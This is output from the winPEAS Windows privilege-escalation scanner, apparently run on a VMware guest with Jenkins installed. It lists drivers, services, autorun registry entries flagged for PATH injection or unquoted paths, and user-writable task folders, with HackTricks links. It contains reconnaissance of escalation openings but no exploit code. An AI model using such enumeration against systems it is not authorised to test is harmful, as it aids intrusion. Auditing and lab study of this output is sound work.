    @ql40xx2i.inf,%ql40xx2i.DriverDesc%;QLogic iSCSI Miniport Inbox Driver(QLogic Corporation - @ql40xx2i.inf,%ql40xx2i.DriverDesc%;QLogic iSCSI Miniport Inbox Driver)[System32\drivers\ql40xx2i.sys] - Boot
   =================================================================================================

    @qlfcoei.inf,%qlfcoei.DriverDesc%;QLogic [FCoE] STOR Miniport Inbox Driver (wx64)(QLogic Corporation - @qlfcoei.inf,%qlfcoei.DriverDesc%;QLogic [FCoE] STOR Miniport Inbox Driver (wx64))[System32\drivers\qlfcoei.sys] - Boot
   =================================================================================================

    @%ProgramFiles%\Windows Defender Advanced Threat Protection\MsSense.exe,-1001(@%ProgramFiles%\Windows Defender Advanced Threat Protection\MsSense.exe,-1001)["C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"] - System
    @%ProgramFiles%\Windows Defender Advanced Threat Protection\MsSense.exe,-1002
   =================================================================================================

    OpenSSH Authentication Agent(OpenSSH Authentication Agent)[C:\Windows\System32\OpenSSH\ssh-agent.exe] - Manual
    Agent to hold private keys used for public key authentication.
   =================================================================================================

    @usbstor.inf,%USBSTOR.SvcDesc%;USB Mass Storage Driver(@usbstor.inf,%USBSTOR.SvcDesc%;USB Mass Storage Driver)[C:\Windows\System32\drivers\USBSTOR.SYS] - System
   =================================================================================================

    @usbxhci.inf,%PCI\CC_0C0330.DeviceDesc%;USB xHCI Compliant Host Controller(@usbxhci.inf,%PCI\CC_0C0330.DeviceDesc%;USB xHCI Compliant Host Controller)[C:\Windows\System32\drivers\USBXHCI.SYS] - System
   =================================================================================================

    VMware Alias Manager and Ticket Service(VMware, Inc. - VMware Alias Manager and Ticket Service)["C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"] - Autoload
    Alias Manager and Ticket Service
   =================================================================================================

    @oem8.inf,%VM3DSERVICE_DISPLAYNAME%;VMware SVGA Helper Service(VMware, Inc. - @oem8.inf,%VM3DSERVICE_DISPLAYNAME%;VMware SVGA Helper Service)[C:\Windows\system32\vm3dservice.exe] - Autoload
    @oem8.inf,%VM3DSERVICE_DESCRIPTION%;Helps VMware SVGA driver by collecting and conveying user mode information
   =================================================================================================

    @oem2.inf,%loc.vmciServiceDisplayName%;VMware VMCI Bus Driver(VMware, Inc. - @oem2.inf,%loc.vmciServiceDisplayName%;VMware VMCI Bus Driver)[System32\drivers\vmci.sys] - Boot
   =================================================================================================

    VMware Host Guest Client Redirector(VMware, Inc. - VMware Host Guest Client Redirector)[system32\DRIVERS\vmhgfs.sys] - System
    Implements the VMware HGFS protocol. This protocol provides connectivity to host files provided by the HGFS server.
   =================================================================================================

    Memory Control Driver(VMware, Inc. - Memory Control Driver)[C:\Windows\system32\DRIVERS\vmmemctl.sys] - Autoload
    Driver to provide enhanced memory management of this virtual machine.
   =================================================================================================

    @oem7.inf,%VMMouse.SvcDesc%;VMware Pointing Device(VMware, Inc. - @oem7.inf,%VMMouse.SvcDesc%;VMware Pointing Device)[C:\Windows\System32\drivers\vmmouse.sys] - System
   =================================================================================================

    VMware Physical Disk Helper(VMware, Inc. - VMware Physical Disk Helper)[C:\Windows\system32\DRIVERS\vmrawdsk.sys] - System
    VMware Physical Disk Helper
   =================================================================================================

    VMware Tools(VMware, Inc. - VMware Tools)["C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"] - Autoload
    Provides support for synchronizing objects between the host and guest operating systems.
   =================================================================================================

    @oem6.inf,%VMUsbMouse.SvcDesc%;VMware USB Pointing Device(VMware, Inc. - @oem6.inf,%VMUsbMouse.SvcDesc%;VMware USB Pointing Device)[C:\Windows\System32\drivers\vmusbmouse.sys] - System
   =================================================================================================

    @oem4.inf,%loc.vmxnet3.ndis6.DispName%;vmxnet3 NDIS 6 Ethernet Adapter Driver(VMware, Inc. - @oem4.inf,%loc.vmxnet3.ndis6.DispName%;vmxnet3 NDIS 6 Ethernet Adapter Driver)[C:\Windows\System32\drivers\vmxnet3.sys] - System
   =================================================================================================

    vnetWFP(VMware, Inc. - vnetWFP)[C:\Windows\system32\DRIVERS\vnetWFP.sys] - System
    Guest Introspection Network Filter Driver
   =================================================================================================

    vsepflt(VMware, Inc. - vsepflt)[system32\DRIVERS\vsepflt.sys] - Boot
    Guest Introspection Driver
   =================================================================================================

    vSockets Virtual Machine Communication Interface Sockets driver(VMware, Inc. - vSockets Virtual Machine Communication Interface Sockets driver)[system32\DRIVERS\vsock.sys] - Boot
    vSockets Driver
   =================================================================================================

    @vstxraid.inf,%Driver.DeviceDesc%;VIA StorX Storage RAID Controller Windows Driver(VIA Corporation - @vstxraid.inf,%Driver.DeviceDesc%;VIA StorX Storage RAID Controller Windows Driver)[System32\drivers\vstxraid.sys] - Boot
   =================================================================================================

    @%SystemRoot%\System32\drivers\vwifibus.sys,-257(@%SystemRoot%\System32\drivers\vwifibus.sys,-257)[C:\Windows\System32\drivers\vwifibus.sys] - System
    @%SystemRoot%\System32\drivers\vwifibus.sys,-258
   =================================================================================================

    @mlx4_bus.inf,%WinMad.ServiceDesc%;WinMad Service(Mellanox - @mlx4_bus.inf,%WinMad.ServiceDesc%;WinMad Service)[C:\Windows\System32\drivers\winmad.sys] - System
   =================================================================================================

    @winusb.inf,%WINUSB_SvcName%;WinUsb Driver(@winusb.inf,%WINUSB_SvcName%;WinUsb Driver)[C:\Windows\System32\drivers\WinUSB.SYS] - System
    @winusb.inf,%WINUSB_SvcDesc%;Generic driver for USB devices
   =================================================================================================

    @mlx4_bus.inf,%WinVerbs.ServiceDesc%;WinVerbs Service(Mellanox - @mlx4_bus.inf,%WinVerbs.ServiceDesc%;WinVerbs Service)[C:\Windows\System32\drivers\winverbs.sys] - System
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Modifiable Services
È Check if you can modify any service https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services
    You cannot modify any service

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking if you can modify any service registry
È Check if you can modify the registry of a service https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services-registry-modify-permissions
    [-] Looks like you cannot change the registry of any service...

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking write permissions in PATH folders (DLL Hijacking)
È Check for DLL Hijacking in PATH folders https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dll-hijacking
    C:\Program Files\Common Files\Oracle\Java\javapath
    C:\Windows\system32
    C:\Windows
    C:\Windows\System32\Wbem
    C:\Windows\System32\WindowsPowerShell\v1.0\
    C:\Windows\System32\OpenSSH\


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Applications Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current Active Window Application
  [X] Exception: Object reference not set to an instance of an object.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Installed Applications --Via Program Files/Uninstall registry--
È Check if you can modify installed software https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#applications
    C:\Program Files\Common Files
    C:\Program Files\desktop.ini
    C:\Program Files\internet explorer
    C:\Program Files\Java
    C:\Program Files\Jenkins
    C:\Program Files\msedge_installer.log
    C:\Program Files\MsEdgeCrashpad
    C:\Program Files\PackageManagement
    C:\Program Files\Uninstall Information
    C:\Program Files\VMware
    C:\Program Files\Windows Defender
    C:\Program Files\Windows Mail
    C:\Program Files\Windows Media Player
    C:\Program Files\Windows Multimedia Platform
    C:\Program Files\windows nt
    C:\Program Files\Windows Photo Viewer
    C:\Program Files\Windows Portable Devices
    C:\Program Files\Windows Security
    C:\Program Files\Windows Sidebar
    C:\Program Files\WindowsApps
    C:\Program Files\WindowsPowerShell


ÉÍÍÍÍÍÍÍÍÍÍ¹ Autorun Applications
È Check if you can modify other users AutoRuns binaries (Note that is normal that you can modify HKCU registry and binaries indicated there) https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html
Error getting autoruns from WMIC: System.Management.ManagementException: Access denied 
   at System.Management.ThreadDispatch.Start()
   at System.Management.ManagementScope.Initialize()
   at System.Management.ManagementObjectSearcher.Initialize()
   at System.Management.ManagementObjectSearcher.Get()
   at winPEAS.Info.ApplicationInfo.AutoRuns.GetAutoRunsWMIC()

    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    Key: VMware User Process
    Folder: C:\Program Files\VMware\VMware Tools
    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr (Unquoted and Space detected) - C:\
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Userinit
    Folder: C:\Windows\system32
    File: C:\Windows\system32\userinit.exe,
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Shell
    Folder: None (PATH Injection)
    File: explorer.exe
   =================================================================================================


    RegPath: HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot
    Key: AlternateShell
    Folder: None (PATH Injection)
    File: cmd.exe
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.l3acm
    Folder: C:\Windows\System32
    File: C:\Windows\System32\l3codeca.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.l3acm
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\l3codeca.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.cvid
    Folder: None (PATH Injection)
    File: iccvid.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================


    RegPath: HKLM\Software\Classes\htmlfile\shell\open\command
    Folder: C:\Program Files\Internet Explorer
    File: C:\Program Files\Internet Explorer\iexplore.exe %1 (Unquoted and Space detected) - C:\
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _wow64cpu
    Folder: None (PATH Injection)
    File: wow64cpu.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _wowarmhw
    Folder: None (PATH Injection)
    File: wowarmhw.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _xtajit
    Folder: None (PATH Injection)
    File: xtajit.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: advapi32
    Folder: None (PATH Injection)
    File: advapi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: clbcatq
    Folder: None (PATH Injection)
    File: clbcatq.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: combase
    Folder: None (PATH Injection)
    File: combase.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: COMDLG32
    Folder: None (PATH Injection)
    File: COMDLG32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: coml2
    Folder: None (PATH Injection)
    File: coml2.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: DifxApi
    Folder: None (PATH Injection)
    File: difxapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdi32
    Folder: None (PATH Injection)
    File: gdi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdiplus
    Folder: None (PATH Injection)
    File: gdiplus.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMAGEHLP
    Folder: None (PATH Injection)
    File: IMAGEHLP.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMM32
    Folder: None (PATH Injection)
    File: IMM32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: kernel32
    Folder: None (PATH Injection)
    File: kernel32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSCTF
    Folder: None (PATH Injection)
    File: MSCTF.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSVCRT
    Folder: None (PATH Injection)
    File: MSVCRT.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NORMALIZ
    Folder: None (PATH Injection)
    File: NORMALIZ.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NSI
    Folder: None (PATH Injection)
    File: NSI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: ole32
    Folder: None (PATH Injection)
    File: ole32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: OLEAUT32
    Folder: None (PATH Injection)
    File: OLEAUT32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: PSAPI
    Folder: None (PATH Injection)
    File: PSAPI.DLL
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: rpcrt4
    Folder: None (PATH Injection)
    File: rpcrt4.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: sechost
    Folder: None (PATH Injection)
    File: sechost.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: Setupapi
    Folder: None (PATH Injection)
    File: Setupapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHCORE
    Folder: None (PATH Injection)
    File: SHCORE.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHELL32
    Folder: None (PATH Injection)
    File: SHELL32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHLWAPI
    Folder: None (PATH Injection)
    File: SHLWAPI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: user32
    Folder: None (PATH Injection)
    File: user32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WLDAP32
    Folder: None (PATH Injection)
    File: WLDAP32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64
    Folder: None (PATH Injection)
    File: wow64.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64win
    Folder: None (PATH Injection)
    File: wow64win.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WS2_32
    Folder: None (PATH Injection)
    File: WS2_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{2C7339CF-2B09-4501-B3F3-F3508C9228ED}
    Key: StubPath
    Folder: \
    FolderPerms: Users [Allow: AppendData/CreateDirectories]
    File: /UserInstall
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
    Key: StubPath
    Folder: C:\Windows\system32
    File: C:\Windows\system32\unregmp2.exe /FirstLogon
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4340}
    Key: StubPath
    Folder: None (PATH Injection)
    File: U
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4383}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\ie4uinit.exe -UserConfig
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\Rundll32.exe C:\Windows\System32\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{A509B1A7-37EF-4b3f-8CFC-4F3A74704073}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\rundll32.exe C:\Windows\System32\iesetup.dll,IEHardenAdmin
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{A509B1A8-37EF-4b3f-8CFC-4F3A74704073}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\rundll32.exe C:\Windows\System32\iesetup.dll,IEHardenUser
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
    Key: StubPath
    Folder: C:\Windows\system32
    File: C:\Windows\system32\unregmp2.exe /FirstLogon
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    Key: StubPath
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\Rundll32.exe C:\Windows\SysWOW64\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{A509B1A7-37EF-4b3f-8CFC-4F3A74704073}
    Key: StubPath
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\rundll32.exe C:\Windows\SysWOW64\iesetup.dll,IEHardenAdmin
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{A509B1A8-37EF-4b3f-8CFC-4F3A74704073}
    Key: StubPath
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\rundll32.exe C:\Windows\SysWOW64\iesetup.dll,IEHardenUser
   =================================================================================================


    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini
    Potentially sensitive file content: LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21787
   =================================================================================================


    Folder: C:\windows\tasks
    FolderPerms: Authenticated Users [Allow: WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows\system32\tasks
    FolderPerms: Authenticated Users [Allow: WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows
    File: C:\windows\system.ini
   =================================================================================================


    Folder: C:\windows
    File: C:\windows\win.ini
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Scheduled Applications --Non Microsoft--
È Check if you can modify other users scheduled binaries https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html

ÉÍÍÍÍÍÍÍÍÍÍ¹ Device Drivers --Non Microsoft--
È Check 3rd party drivers for known vulnerabilities/rootkits. https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#drivers
    QLogic Gigabit Ethernet - 7.12.31.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxvbda.sys
    QLogic 10 GigE - 7.13.65.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\evbda.sys
    QLogic FastLinQ Ethernet - 8.33.20.103 [Cavium, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qevbda.sys
    NVIDIA nForce(TM) RAID Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvraid.sys
    VMware vSockets Service - 9.8.19.0 build-18956547 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vsock.sys
    VMware PCI VMCI Bus Device - 9.8.18.0 build-18956547 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmci.sys
    Intel Matrix Storage Manager driver - 8.6.2.1019 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorV.sys
     Promiser SuperTrak EX Series -  5.1.0000.10 [Promise Technology, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\stexstor.sys
    LSI 3ware RAID Controller - WindowsBlue [LSI]: \\.\GLOBALROOT\SystemRoot\System32\drivers\3ware.sys
    AHCI 1.3 Device Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsata.sys
    Storage Filter Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdxata.sys
    AMD Technology AHCI Compatible Controller - 3.7.1540.43 [AMD Technologies Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsbs.sys
    Adaptec RAID Controller - 7.5.0.32048 [PMC-Sierra, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\arcsas.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ItSas35i.sys
    LSI Fusion-MPT SAS Driver (StorPort) - 1.34.03.83 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas2i.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas3i.sys
    LSI SSS PCIe/Flash Driver (StorPort) - 2.10.61.81 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sss.sys
    MEGASAS RAID Controller Driver for Windows - 6.706.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas.sys
    MEGASAS RAID Controller Driver for Windows - 6.714.05.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\MegaSas2i.sys
    MEGASAS RAID Controller Driver for Windows - 7.705.08.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas35i.sys
    MegaRAID Software RAID - 15.02.2013.0129 [LSI Corporation, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasr.sys
    Marvell Flash Controller -  1.0.5.1016  [Marvell Semiconductor, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\mvumis.sys
    NVIDIA nForce(TM) SATA Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvstor.sys
    MEGASAS RAID Controller Driver for Windows - 6.805.03.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas2i.sys
    MEGASAS RAID Controller Driver for Windows - 6.604.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas3i.sys
    Microsoftr Windowsr Operating System - 2.60.01 [Silicon Integrated Systems Corp.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SiSRaid2.sys
    Microsoftr Windowsr Operating System - 6.1.6918.0 [Silicon Integrated Systems]: \\.\GLOBALROOT\SystemRoot\System32\drivers\sisraid4.sys
    VIA RAID driver - 7.0.9600,6352 [VIA Technologies Inc.,Ltd]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vsmraid.sys
